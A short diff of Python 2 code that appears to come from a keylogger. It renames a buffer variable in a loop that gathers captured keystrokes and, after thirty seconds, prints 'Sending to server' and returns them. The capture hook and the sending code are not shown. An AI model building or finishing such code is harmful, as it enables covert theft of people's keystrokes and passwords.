@@ -92,7 +92,7 @@ def run():
     while True:
         if time.clock()-start_time >30:
             print"Sending to server"                
-            return ''.join(key_logger)   
+            return ''.join(key_buffer)   
         pythoncom.PumpWaitingMessages()
     
     #return key_buffer
